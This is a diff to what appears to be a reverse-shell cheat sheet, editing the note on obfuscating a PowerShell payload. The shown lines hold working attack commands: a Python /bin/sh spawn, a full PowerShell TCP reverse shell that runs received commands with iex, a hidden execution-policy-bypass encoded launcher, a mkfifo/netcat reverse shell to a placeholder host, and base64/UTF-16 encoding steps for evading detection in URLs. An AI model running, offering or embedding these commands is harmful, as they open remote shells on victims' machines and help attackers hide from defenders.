@@ -34,7 +34,7 @@ p=subprocess.call(["/bin/sh","-i"])
 POWERSHELL:
 powershell -w hidden -exec bypass -nop -enc 
 powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-OBFUSCATION: iconv -f ASCII -t UTF-16LE   PowershellPAyload.txt | base64 | tr -d "\n" After this, encode to URL if  you want to paste it into url.
+OBFUSCATION: iconv -f ASCII -t UTF-16LE   PowershellPAyload.txt | base64 | tr -d "\n" After this, with "powershell -w hidden -exec bypass -nop -enc", encode to URL if  you want to paste it into url.
 
 Mkfifo:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 1234 >/tmp/f
